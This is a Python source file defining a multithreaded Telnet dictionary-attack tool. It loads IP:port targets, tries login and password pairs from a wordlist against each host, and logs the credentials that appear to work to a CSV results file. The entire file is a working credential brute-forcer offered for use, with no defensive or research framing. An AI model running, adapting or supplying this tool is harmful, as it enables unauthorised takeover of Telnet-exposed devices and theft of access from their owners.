'''
@author: wardog
'''
import logging
import math
import traceback
import threading
import telnetlib
import time
import re

class TelnetDictionaryAttack(object):

    dictionary = []
    listTargets = []
    nbThread = 1
    timeOut = 3
    timeOutPassword = 10
    targetsResultFile = 'targetsResults.csv'
    
    _loopThread = []
    _stopLoop = False
    
    _statNbTry = 0
    _statNbFind = 0
    _statStartTime = time.perf_counter()
    _lock = threading.Lock()
    
    
    def __init__(self, dictionary, listTargets, nbThread, timeOut, timeOutPassword, targetsResultFile):
        self.logger = logging.getLogger()
        self.dictionary = dictionary
        
        self.timeOut = timeOut
        self.timeOutPassword = timeOutPassword
        
        self.initTargets(listTargets)
        self.initNbThreads(nbThread)
        self.targetsResultFile = targetsResultFile
        
        

    def initNbThreads(self,nbThread):
        
        if nbThread == 0 :
            self.logger.debug('__init__ with a thread per target')
            self.nbThread = len(self.listTargets)
        
        else :
            self.nbThread = nbThread
    
    
    def initTargets(self,listTargets):
        if type(listTargets) is str:
            self.logger.debug('__init__ with a target file')
            
            f = open(listTargets,'r')
            with f:
                for line in f:
                
                    line = line.strip()
                    
                    match = re.match('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d*$',line)
                    
                    if match != None :                    
                        self.listTargets.append(line)
                        self.logger.debug("Add target : " + line)
                    else:
                        self.logger.warn("Not a valid target : " + line)

        elif type(listTargets) is list:
            self.logger.debug('__init__ with a target list')
            self.listTargets = listTargets
        else:
            raise AttributeError('not a targets file or a list of targets')

    def stopAttack(self):
        self._stopLoop = True

    def startAttack(self):
        self._stopLoop = False
        self.logger.info("Service scanner start with " + str(self.nbThread) + " threads and " + str(len(self.listTargets)) + " targets")
        
        ceilNbTargetsPerThread = math.ceil(len(self.listTargets)/self.nbThread)         
        for i in range(0, self.nbThread):
            subTargetsList = self.listTargets[i * ceilNbTargetsPerThread :(i+1) * ceilNbTargetsPerThread]
            self._loopThread.append(threading.Thread(target = self._attackLoop, args=([subTargetsList]))) 
            self._loopThread[i].start()
            self.logger.debug("Telnet attack thread [" + self._loopThread[i].getName() + "] started")
            
    def _attackLoop(self,subTargetsList):

            
        self.logger.debug("Start attack loop")
        
        self._stopLoop = False
        
        for i in range(0, len(subTargetsList)):
            
            host,port = subTargetsList[i].split(':')
            self.attackOneHost(host,port,self.dictionary)
            
            if(self._stopLoop):
                break
                
    def attackOneHost(self,host,port,loginPasswords):  
        for loginPassword in loginPasswords:

            
            
            login = loginPassword[0].encode('ascii')
            password = loginPassword[1].encode('ascii')
        
            self.logger.debug("Target : " +host +':' + port + " trying with : " + str(loginPassword))
            
            try:
                tn = telnetlib.Telnet(host,port)

                result = tn.read_until(b"login: ",self.timeOut)
                tn.write(login + b"\n")
            
                result = tn.read_until(b"Password:",self.timeOut)
            
                
                if result.endswith(b"Password:"):
                    tn.write(password + b"\n")
                    result = tn.read_until(b"incorrect", self.timeOutPassword)
                    
                    if not (result.endswith(b"incorrect") or result.endswith(b"failed!") or result.endswith(b"invalid") or result.endswith(b"Username:") or result.endswith(b"Username: ") or result.endswith(b"login:") or result.endswith(b"Login:")):
                        
                        f = open(self.targetsResultFile, 'a')
                        with self._lock,f:  
                            self._statNbFind += 1  
                            
                            deltaTime = time.perf_counter() - self._statStartTime               
                            self.logger.info("Login/Password maybe found : " +host +':' + port + ' with ' + str(login) + "/" + str(password) + ' result : ' + str(result))
                            
                            f.write(str(host)+':'+ str(port) + ';' + str(login) + ";" + str(password) + ';' + str(result) +'\n')
                            f.close()
                        
                        break
                    else:
                        self.logger.debug("bad try...")
                        
                else:
                    self.logger.warning("Unexpected result : " + result + ' on : ' + host +':' + port + ' with ' + str(login) + "/" + str(password))
                
                tn.close()   
            
            except BaseException as e:
                self.logger.warning("Trouble with target : " + host +':' + port + ' cause : ' + str(e))
                traceback.format_exc()    
                break   
                    
                    